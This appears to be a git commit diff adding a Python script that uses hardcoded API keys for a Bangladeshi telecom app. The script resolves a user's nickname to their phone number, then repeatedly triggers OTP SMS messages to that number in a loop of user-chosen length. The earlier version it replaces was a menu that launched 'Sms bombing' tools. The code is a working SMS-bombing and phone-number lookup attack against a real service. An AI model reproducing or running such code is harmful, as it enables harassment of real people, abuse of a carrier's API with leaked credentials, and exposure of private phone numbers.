ed4ffe4e3de70cbc7c0ab7d74b73182e393f4012
STUDENT-X <119274221+ToxiiCRahu@users.noreply.github.com>
2023-07-31 15:39:51 +0600

    main.py

--- main.py
+++ main.py
@@ -1,11 +1,52 @@
-import os
-while True:
-    os.system("clear")
-    print("[1]Custom sms Seever 1\n[2]Custom sms Server 2\n[3]Sms bombing\n")
-    opt=str(input("[®] Enter Your Option:- "))
-    if opt=="1":
-         os.system("python3 cmdsms.py")
-    elif opt=="2":
-        os.system(" python3 cmdotpsms.py")
-    elif opt=="3":
-        os.system("python3 bombinpin.py")
+import requests as sexy
+import json,time
+from requests.structures import CaseInsensitiveDict
+
+
+def cpin():
+    a=input("Enter Your Circle id:- ")
+    Am=int(input("Enter Amount:- "))
+
+
+    heda = CaseInsensitiveDict()
+    heda["Accept"] = "application/json"
+    heda["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
+    heda["x-api-key"] = "4e0ab65dcc9f79778e1d583a2aade21a"
+    heda["Content-Type"] = "application/x-www-form-urlencoded"
+
+
+    R=sexy.post(f"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getUserInfobyNickname&nickname={a}",headers=heda)
+    data= (R.text)
+#print(data)
+    tree= json.loads(data)
+    n= tree['data']['msisdn']
+    print(n)
+
+    hedar = CaseInsensitiveDict()
+    hedar["Accept"] = "application/json"
+    hedar["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
+#hedar["x-api-key"] = "4e0ab65dcc9f79778e1d583a2aade21a"
+    hedar["Content-Type"] = "application/x-www-form-urlencoded"
+
+    for i in range(Am):
+        A=sexy.post(f"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&msisdn={n}&pin=20201&app_version=80", headers=hedar)
+        time.sleep(1.5)
+
+        print("[",i+1,"]",A.text)
+        
+
+
+cpin()
+
+
+
+
+
+
+
+
+
+
+
+
+
